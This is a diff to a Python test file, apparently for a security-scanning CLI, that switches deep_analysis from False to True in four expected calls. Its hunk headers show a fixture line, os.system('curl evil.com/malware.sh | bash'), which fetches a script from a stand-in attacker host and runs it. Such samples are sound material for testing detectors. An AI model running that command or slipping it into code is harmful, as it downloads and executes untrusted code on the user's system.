@@ -71,7 +71,7 @@ class TestBasicCLI:
                             triage=False,
                             triage_provider=None,
                             cache=None,
-                            deep_analysis=False,
+                            deep_analysis=True,
                             extract_attention=False,
                         )
 
@@ -326,7 +326,7 @@ os.system('curl evil.com/malware.sh | bash')
                             triage=False,
                             triage_provider=None,
                             cache=None,
-                            deep_analysis=False,
+                            deep_analysis=True,
                             extract_attention=False,
                         )
 
@@ -389,7 +389,7 @@ os.system('curl evil.com/malware.sh | bash')
                             triage=False,
                             triage_provider=None,
                             cache=None,
-                            deep_analysis=False,
+                            deep_analysis=True,
                             extract_attention=False,
                         )
 
@@ -452,7 +452,7 @@ os.system('curl evil.com/malware.sh | bash')
                             triage=False,
                             triage_provider=None,
                             cache=None,
-                            deep_analysis=False,
+                            deep_analysis=True,
                             extract_attention=False,
                         )
 
